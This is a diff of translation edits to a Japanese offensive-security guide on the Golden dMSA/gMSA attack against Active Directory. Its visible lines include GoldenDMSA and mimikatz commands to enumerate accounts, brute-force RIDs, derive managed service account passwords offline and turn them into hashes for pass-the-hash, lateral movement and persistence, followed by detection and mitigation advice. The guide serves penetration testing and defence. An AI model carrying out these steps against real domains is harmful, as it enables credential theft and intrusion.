@@ -56,7 +56,7 @@ mimikatz # lsadump::trust /patch   # shows KDS root keys too
 Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
 Select sAMAccountName,objectSid,msDS-ManagedPasswordId
 ```
-[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) はヘルパーモードを実装しています：
+[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) はヘルパーモードを実装しています:
 ```powershell
 # LDAP enumeration (kerberos / simple bind)
 GoldendMSA.exe info -d example.local -m ldap
@@ -64,15 +64,15 @@ GoldendMSA.exe info -d example.local -m ldap
 # RID brute force if anonymous binds are blocked
 GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
 ```
-### フェーズ 3 – ManagedPasswordID を推測 / 発見する（欠如している場合）
+### フェーズ 3 – ManagedPasswordIDを推測/発見する（欠如している場合）
 
-一部のデプロイメントでは、`msDS-ManagedPasswordId` を ACL 保護された読み取りから *除去* します。  
-GUID は 128 ビットであるため、単純なブルートフォースは実行不可能ですが：
+一部のデプロイメントでは、`msDS-ManagedPasswordId`をACL保護された読み取りから*削除*します。  
+GUIDは128ビットであるため、単純なブルートフォースは実行不可能ですが：
 
-1. 最初の **32 ビット = アカウント作成の Unix エポック時間**（分単位の解像度）。
-2. 続いて 96 ビットのランダムなビット。
+1. 最初の**32ビット = アカウント作成のUnixエポック時間**（分単位の解像度）。
+2. その後に96ビットのランダムなビットが続きます。
 
-したがって、**アカウントごとの狭い単語リスト**（± 数時間）は現実的です。
+したがって、**アカウントごとの狭い単語リスト**（±数時間）は現実的です。
 ```powershell
 GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
 ```
@@ -80,7 +80,7 @@ GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUI
 
 ### フェーズ 4 – オフラインパスワード計算と変換
 
-ManagedPasswordIDが知られると、有効なパスワードは1コマンドの距離にあります：
+ManagedPasswordIDが知られると、有効なパスワードは1コマンドの距離にあります:
 ```powershell
 # derive base64 password
 GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>
@@ -88,15 +88,15 @@ GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPass
 # convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
 GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
 ```
-結果として得られたハッシュは、**mimikatz**（`sekurlsa::pth`）や**Rubeus**を使用してKerberosの悪用に注入でき、ステルスな**横移動**と**持続性**を可能にします。
+結果として得られるハッシュは、**mimikatz**（`sekurlsa::pth`）や**Rubeus**を使用してKerberosの悪用に注入でき、ステルスな**横移動**と**持続性**を可能にします。
 
 ## 検出と緩和
 
 * **DCバックアップおよびレジストリハイブの読み取り**機能をTier-0管理者に制限します。
 * DCでの**ディレクトリサービス復元モード（DSRM）**または**ボリュームシャドウコピー**の作成を監視します。
-* `CN=Master Root Keys,…`およびサービスアカウントの`userAccountControl`フラグの読み取り/変更を監査します。
+* サービスアカウントの`CN=Master Root Keys,…`および`userAccountControl`フラグの読み取り/変更を監査します。
 * 異常な**base64パスワードの書き込み**や、ホスト間での突然のサービスパスワードの再利用を検出します。
-* Tier-0の隔離が不可能な場合、高特権gMSAを**クラシックサービスアカウント**に変換し、定期的なランダムローテーションを行うことを検討します。
+* Tier-0の隔離が不可能な場合、高特権のgMSAを**クラシックサービスアカウント**に変換し、定期的なランダムローテーションを行うことを検討します。
 
 ## ツール
 
@@ -106,7 +106,7 @@ GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
 
 ## 参考文献
 
-- [Golden dMSA – 委任された管理サービスアカウントの認証バイパス](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [Golden dMSA – 委任されたマネージドサービスアカウントの認証バイパス](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
 - [Semperis/GoldenDMSA GitHubリポジトリ](https://github.com/Semperis/GoldenDMSA)
 - [Improsec – Golden gMSA信頼攻撃](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)
 
